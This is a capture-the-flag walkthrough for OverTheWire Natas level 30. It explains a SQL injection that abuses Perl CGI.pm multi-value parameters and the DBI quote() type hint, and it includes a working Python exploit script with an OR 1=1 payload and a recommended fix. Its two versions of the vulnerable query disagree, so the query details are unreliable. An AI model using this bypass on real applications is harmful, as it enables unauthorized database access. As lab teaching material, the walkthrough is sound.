# OverTheWire: Natas — Level 30 → Level 31

> **Vulnerability:** SQL Injection via Perl CGI `param()` Array Coercion and `DBI::quote()` Type-Hint Bypass                             
> **Skills:** Perl CGI internals, DBI/DBD quoting behavior, multi-value POST parameter manipulation                                    
> **Difficulty:** Hard                                                                              
> **Official Page:** [Natas Level 30](https://overthewire.org/wargames/natas/natas30.html)                                     

---

## Access

- **URL:** `http://natas30.natas.labs.overthewire.org`
- **Username:** `natas30`
- **Password:** *obtain from previous level*

---

## Task

Find the password for `natas31` by exploiting a SQL injection vulnerability hidden inside what appears to be a safely parameterized Perl login form.

---

## Vulnerability

The application uses Perl's `DBI` library and calls `$dbh->quote()` on user input before interpolating it into a raw SQL string — a pattern that looks safe at first glance but is not. The flaw has two chained parts:

1. **CGI.pm `param()` returns a list when a field is submitted more than once.** If the HTTP request contains `password=val1&password=val2`, then `param('password')` does not return a scalar — it returns a Perl list `("val1", "val2")`.

2. **`DBI::quote()` accepts an optional second argument: a data-type hint.** When passed an integer type hint (e.g., `4`, which corresponds to `SQL_INTEGER`), the DBD driver treats the value as a number and skips all string-quoting and escaping. The first element of the list becomes the raw, unquoted value injected into the SQL query.

The combination means an attacker can submit `password` twice — once as a SQL expression and once as an integer — causing `quote()` to pass the SQL expression through unescaped. This is a **SQL injection via type coercion**, enabled by a misunderstanding of how Perl's CGI parameter handling interacts with DBI's quoting API.

---

## Theory

### Perl CGI.pm — Multi-Value Parameters

In a standard HTML form, each field has one value. But HTTP does not prevent a field name from appearing multiple times in a POST body:

```
username=natas31&password=hello&password=4
```

Perl's `CGI.pm` module exposes form values through `param()`. In scalar context, `param('password')` returns only the *first* value. But when the return value is used as a list — or passed directly to a function that accepts a list — it returns *all* values submitted for that field name:

```perl
# Submitted: password=hello&password=4
my @vals = param('password');  # ("hello", 4)
```

This is normal, documented behavior in CGI.pm, but it creates a dangerous implicit contract when combined with functions that interpret multiple arguments differently from a single one.

### DBI — `$dbh->quote()` and Type Hints

`DBI::quote()` is the standard Perl method for safely escaping a value before interpolating it into a SQL string:

```perl
my $safe = $dbh->quote("O'Brien");
# Returns: 'O''Brien'  (escaped for SQL)
```

It accepts a **second optional argument**: an integer representing a SQL data type (from the `DBI` constants or `SQL_*` constants). When this type hint is an integer type — such as `4` (`SQL_INTEGER`) — many DBD drivers skip string quoting entirely and return the raw value, because an integer does not need to be quoted or escaped in SQL:

```perl
$dbh->quote("anything", 4);
# May return: anything   (no quotes, no escaping)
```

This is intended behavior for building queries with numeric values. It becomes a vulnerability when the input is not actually a number but is attacker-controlled.

### How the Vulnerable Code Combines Both

The vulnerable application's login handler looks approximately like this:

```perl
# Reconstructed — see post-file note
my $query = "SELECT * FROM users WHERE username='". $dbh->quote(param('username')) ."'
             AND password=". $dbh->quote(param('password'));
```

When `password` is submitted once, `param('password')` returns a scalar string, `quote()` wraps it safely in quotes, and the query is safe. But when `password` is submitted *twice* as `password=<expr>&password=4`:

- `param('password')` returns the list `("<expr>", 4)`
- `$dbh->quote("<expr>", 4)` receives the expression as the value and `4` as the type hint
- The DBD driver, treating the type as integer, returns `<expr>` unquoted and unescaped
- The expression is injected directly into the SQL query

### How Python `requests` Encodes List Values

When you pass a list as the value in a `requests` POST payload, the library encodes each element as a separate field with the same name:

```python
payload = {'password': ["'lol' or 1=1", 4]}
```

This is sent over the wire as:

```
password=%27lol%27+or+1%3D1&password=4
```

Which the server decodes as two separate `password` fields — exactly what is needed to trigger the CGI.pm list behavior.

### Concept Reference Table

| Concept | What It Is | Used in This Level? |
|---|---|---|
| `CGI.pm param()` | Perl module for reading HTTP form parameters; returns lists for repeated fields | Yes — core to the exploit |
| `DBI::quote()` | Escapes a value for safe SQL interpolation | Yes — bypassed via type hint |
| `SQL_INTEGER` (type `4`) | DBI type constant indicating an integer value; skips string quoting | Yes — the type-hint bypass |
| SQL Injection | Inserting SQL logic into a query through unsanitized input | Yes — the resulting attack |
| Prepared statements | Parameterized queries that separate code from data, immune to this attack | Good to know — not used here |
| `OR 1=1` tautology | SQL condition that always evaluates to true, bypassing WHERE filters | Yes — used in payload |
| HTTP Basic Auth | Base64-encoded `username:password` sent in the `Authorization` header | Yes — required to access the app |

---

## Solution

### Step 1 — Inspect the Application Source

Navigate to `http://natas30.natas.labs.overthewire.org` and log in with your `natas30` credentials when prompted by the browser's HTTP Basic Auth dialog.

Once inside, view the page source (right-click → View Page Source, or Ctrl+U). The application is a simple login form that POSTs `username` and `password` to `index.pl`.

> **What to notice:** The backend is a Perl CGI script (`.pl` extension). This immediately suggests CGI.pm is likely in use for parameter handling.

### Step 2 — Read the Vulnerable Source Code

The page includes a link to view the source, or you can access `index.pl` directly. The relevant portion of the server-side Perl code is:

```perl
if('POST' eq request_method && param('username') && param('password')){
    my $dbh = Connect();
    my $query = "SELECT * FROM users WHERE username=\"".
                $dbh->quote(param('username')) ."\" AND password=\"".
                $dbh->quote(param('password')) ."\"";
    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $row = $sth->fetchrow_hashref();
    ...
}
```

> **What to notice:** The developer is manually interpolating `quote()`-ed values into a raw SQL string. This is *not* a prepared statement. The critical insight is that `param('password')` is called with no scalar context enforcement — it can silently return a list if `password` appears more than once in the POST body.

### Step 3 — Understand What the Injected Query Becomes

Under normal use with `password=hello`:

```sql
SELECT * FROM users WHERE username="natas31" AND password="hello"
```

When you submit `password='lol' or 1=1` and `password=4` (two fields):

- `param('password')` returns the list `("'lol' or 1=1", 4)`
- `$dbh->quote("'lol' or 1=1", 4)` returns `'lol' or 1=1` — raw and unquoted, because type hint `4` suppresses escaping
- The resulting query becomes:

```sql
SELECT * FROM users WHERE username="natas31" AND password='lol' or 1=1
```

The `OR 1=1` tautology makes the entire `WHERE` clause always true. The query returns natas31's row regardless of the actual password.

> **What to notice:** The `4` is not part of the SQL payload — it is the *type hint* passed as the second argument to `quote()`. It never appears in the query. Its only role is to disable quoting for the first argument.

### Step 4 — Write and Run the Exploit Script

```python
import requests
from requests.auth import HTTPBasicAuth

user = 'natas30'
passw = '<natas30_password>'

# Submitting 'password' twice in the POST body:
#   password='lol' or 1=1   <-- the SQL injection expression
#   password=4               <-- the DBI type hint that disables quoting
# requests encodes a list value as repeated fields with the same name.
payload = {
    'username': 'natas31',
    'password': ["'lol' or 1=1", 4]
}

response = requests.post(
    'http://natas30.natas.labs.overthewire.org/index.pl',
    data=payload,
    auth=HTTPBasicAuth(user, passw)
)

print(response.text)
```

```
<!DOCTYPE html>
<html>
...
<div id="content">
Successful login! The password for natas31 is <password_string_here>
...
</div>
</html>
```

> **What to notice:** The response HTML contains the plaintext password for natas31 embedded in the success message. Scan the output for the password string — it appears after "The password for natas31 is".

### Step 5 — Extract the Password

The password is printed inline in the HTML body. Copy it from the terminal output. It will appear in a line resembling:

```
Successful login! The password for natas31 is <redacted>
```

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

Calling `$dbh->quote()` on user input is not equivalent to using a prepared statement. When `quote()` is given an integer type hint as its second argument, it may skip string escaping entirely — and Perl's CGI.pm silently supplies that second argument when `param()` returns a list from a repeated POST field. The fix is to always use parameterized queries (`$sth->execute($username, $password)`) so that the database driver, not application code, handles value binding.

In real-world applications, this class of vulnerability is easy to miss in code review because the developer's intent (`quote()` everything) looks correct — the danger is buried in a non-obvious interaction between two separate library behaviors.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Sending `password` only once | `param('password')` returns a scalar; `quote()` escapes it correctly; no injection | Send `password` as a list: `["<expr>", 4]` in the requests payload |
| Using `4` as a string, not an integer | Python encodes it as `password=4` (still correct — requests doesn't distinguish) | No change needed; the CGI side reads it as a scalar `"4"`, but the list context still passes `4` as the type hint to `quote()` |
| Targeting `username` for injection instead of `password` | `username` is quoted in a straightforward scalar context; the list trick does not apply | Only `password` is vulnerable here because of how the query is structured |
| Expecting JSON or a clean response | The application returns full HTML; parse `response.text` or `grep` for the password string | Print `response.text` and search visually or with `re.search()` |
| Forgetting HTTP Basic Auth | The server returns a `401 Unauthorized` before the form is ever processed | Always pass `auth=HTTPBasicAuth(user, passw)` in the request |
